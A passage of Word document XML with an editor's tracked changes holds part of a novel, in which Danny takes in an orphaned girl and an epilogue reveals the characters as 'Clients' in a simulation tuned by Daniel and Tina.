            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>!</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00393D9F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3164" w:author="TextVet" w:date="2016-03-29T13:55:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> she screamed, knowing the answer.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tried </w:t>
      </w:r>
      <w:del w:id="3165" w:author="TextVet" w:date="2016-03-29T13:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00393D9F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:ins w:id="3166" w:author="TextVet" w:date="2016-03-29T13:56:00Z">
        <w:r w:rsidR="00A4122F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>peaking</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3167" w:author="TextVet" w:date="2016-03-29T13:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A4122F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ay something</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, but only stammered. The young girl stifled tears with a wet gulp. She sprang </w:t>
      </w:r>
      <w:ins w:id="3168" w:author="TextVet" w:date="2016-03-29T13:56:00Z">
        <w:r w:rsidR="00045666">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>up</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3169" w:author="TextVet" w:date="2016-03-29T13:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00045666">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>from her seat</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, pushed past Danny, and bolted up the steps. Danny watched her helplessly, his mouth agape.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clasped a hand on Danny’s shoulder and said, “I’ve raised children of my own,” before briskly ascending the steep cabin stairway after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eyes, wide with heartbroken delirium, drifted to each of his comrades in turn. “You… You guys didn’t tell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cabin responded with silence. On the deck above, the child’s hysterical sobs shattered the night.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“What’s going to happen to her?” Danny asked, his stomach lurching.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="006915DE" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3170" w:author="TextVet" w:date="2016-03-29T13:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>An eon</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3171" w:author="TextVet" w:date="2016-03-29T13:57:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="006915DE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Several more moments</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of silence passed. Tina finally broke it. “She has no other family. We asked her while we were waiting for you. She</w:t>
      </w:r>
      <w:ins w:id="3172" w:author="TextVet" w:date="2016-03-29T13:58:00Z">
        <w:r w:rsidR="00551167">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3173" w:author="TextVet" w:date="2016-03-29T13:58:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00551167">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s nowhere to go.”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“Sergey was adamant that she doesn’t end up in foster care,” said Danny, his head spinning. “You remember, right? In my bedroom? He said a girl her age would never…”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remember,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told her to listen to me. That I’d protect her,” Danny leaned heavily against the wood-paneled cabin wall. “He told me to take care of her. Those were his last words.”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gently began, “Danny, you didn’t…”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cut her off. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Because of me,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> those were his last words.”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intervened via the screen. “Danny, listen to me. It’s natural to feel guilty over something like this. Possibly even indebted. But you couldn’t have known. What happened wasn’t your fault. Feelings of remorse are unnecessary right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listened to the child’s cries on the moonlit deck above. “What </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>should</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> I be feeling right now, then?”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responded, “How about, proud of yourself for simply getting out alive?”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emitted a hollow, humorless chuckle. “The things I choose to perceive as meriting pride are pretty arbitrary, don’t you think?”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sobbing outside began to soften. Jason’s voice could be heard offering soothing, indistinct words.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at Tina and locked eyes with her. “Remember what we talked about back in the Rite Aid,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 “Of course I do, Danny. You talked about how you believed you had an unclaimed destiny of greatness. How you’re supposed to create something amazing that would shape the whole world. Something like that,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smiled warmly. “Exactly. But… my own greatness isn’t really </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>about</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> me, is it? It never has been. That’s the whole point…”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Small, light footsteps descended behind him. Rosie had broken away from Jason above. With sobs still racking her small shoulders, she ran to Danny and buried her face against his shirt.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 instinctively reached out to hug her, and stroked her hair as her whimpers tapered to silence. “I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> want to create something amazing,” he said as he wiped the child’s tears. “I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> want to shape the world. Maybe this is how.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00B45500">
      <w:pPr>
        <w:pStyle w:val="ActBreak"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Epilogue</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>31</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Client 4.7.3 played</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> before an adoring throng of pink-haired girls and slim-hipped guys. His electric guitar screamed in ecstasy beneath his motion-blurred fingers. The song finished</w:t>
      </w:r>
      <w:ins w:id="3174" w:author="TextVet" w:date="2016-03-29T14:00:00Z">
        <w:r w:rsidR="00E46477">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3175" w:author="TextVet" w:date="2016-03-29T14:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E46477">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> he spread his arms to embrace the spotlight.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felt sick to his stomach.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His life was a hedonistic montage of rock god glory — and he hated every second of it. Sex was cheap and joyless. Drugs numbed him but brought </w:t>
      </w:r>
      <w:del w:id="3176" w:author="TextVet" w:date="2016-03-29T14:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E46477">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">him </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>no pleasure. Mansions were only good for parties, and he could no longer stand the people he partied with.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cancelled his tour, revved up his rusty old Ford F-150, and drove all the way back to his home</w:t>
      </w:r>
      <w:del w:id="3177" w:author="TextVet" w:date="2016-03-29T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E46477">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town. Down the street from his high school, at a glitzy new shopping center, he found a small independent coffee shop. He booked a gig there under his original name, and played a few sombre tunes that he</w:t>
      </w:r>
      <w:ins w:id="3178" w:author="TextVet" w:date="2016-03-29T14:02:00Z">
        <w:r w:rsidR="003047C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3179" w:author="TextVet" w:date="2016-03-29T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003047C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d never gotten a chance to release because they didn’t fit his “image”. There were only six people in that audience, but he looked into each of their eyes as he sang. And when his set was over, he went out back for a cigarette, and sobbed with joy.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00F86333" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:before="480" w:after="480" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:pict>
          <v:rect id="_x0000_i1027" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pic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“We’re still detecting photostimulation-induced emetic potentition.”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thought the nausea was part of the narrative this time.”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“Creative Control worked the defect into the storyboard with some very quick thinking. But it’s a bug, not a feature.”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“Alright. I’ll patch it in the next release build.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00F86333" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:before="480" w:after="480" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict>
          <v:rect id="_x0000_i1028" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pic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Client 4.8.1 had vowed for years that someday she would just drop everything — her six-figure legal career, her Chelsea loft, her wine-guzzling girlfriends — and go open a small cupcake shop in Maine. It was just a joke, a mere idle fantasy, until the day she finally mustered her courage and did it. At first</w:t>
      </w:r>
      <w:ins w:id="3180" w:author="TextVet" w:date="2016-03-29T14:03:00Z">
        <w:r w:rsidR="004F238B">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she was terrified that she would hate it. But watching people buy her colorful puffballs — seeing their eyes light up when they took a bite and hearing that little squeal they made through a mouth full of soft deliciousness — gave her a genuine thrill every time. It was hard work</w:t>
      </w:r>
      <w:ins w:id="3181" w:author="TextVet" w:date="2016-03-29T14:03:00Z">
        <w:r w:rsidR="004F238B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3182" w:author="TextVet" w:date="2016-03-29T14:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004F238B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> business was frequently uneasy and uncertain. Yet here she was, turning on her bakery lights at 5am on a frigid</w:t>
      </w:r>
      <w:ins w:id="3183" w:author="TextVet" w:date="2016-03-29T14:04:00Z">
        <w:r w:rsidR="00B1010B">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orange-leafed autumn morning, ready to bake a breakfast selection of Halloween-themed pastries. And she couldn’t be happier.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If only the lights in her eyes didn’t make her queasy for some reason…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00F86333" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:before="480" w:after="480" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:pict>
          <v:rect id="_x0000_i1029" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pic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thought you said you</w:t>
      </w:r>
      <w:ins w:id="3184" w:author="TextVet" w:date="2016-03-29T14:04:00Z">
        <w:r w:rsidR="00B1010B">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fixed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thought I did! Here, come take a look…”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Daniel sat before a translucent screen wide enough to wrap in a half-circle around his desk. His head was silhouetted in its light — the smooth dome of his cranium, the loose strands around his temples, the fluffy silver fur around his chin.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screen itself glowed with a maze of windows. Some held software devel</w:t>
      </w:r>
      <w:ins w:id="3185" w:author="TextVet" w:date="2016-03-29T14:05:00Z">
        <w:r w:rsidR="00B1010B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pment environments, with colorful cascades of indented text. Some showed rotating three-dimensional wire-mesh diagrams of organic structures. Some displayed rendered animations of mundane scenes — a small-town coffee shop, a bakery in Maine.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the window he focused on now was a long, jagged graph of parallel sensor readouts.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do you think, T? I’m not doing that, am I?”</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“You are.” Tina leaned her face beside his, studying the chart. She draped an arm over Daniel’s shoulder, and he reciprocated with a hand on the small of her back. The </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>march of time had chiseled her contours into a firm visage of competence and confidence, smart and strong and feminine. She radiated a kind of mature beauty only expressed in those who</w:t>
      </w:r>
      <w:ins w:id="3186" w:author="TextVet" w:date="2016-03-29T14:06:00Z">
        <w:r w:rsidR="003B10EB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3187" w:author="TextVet" w:date="2016-03-29T14:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003B10EB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ve rightfully earned it. “The </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>area postrema</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> is extremely dopamine-sensitive. You’re trying too hard. Turn down the external stimulation. Let the cognitive systems do the work. Let them come to their conclusions on their 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smiled. “Ah. Of course. That </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the entire point.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003D568C" w:rsidRDefault="003D568C" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="3188" w:author="TextVet" w:date="2016-03-29T14:06:00Z"/>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Alyssa Crawford felt the cushion</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> beneath her back, the headset straps behind her ears. Her hands clutched at the armrests of her recliner, and she started to pull herself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w:t>
      </w:r>
      <w:del w:id="3189" w:author="TextVet" w:date="2016-03-29T14:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005D499C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> no</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
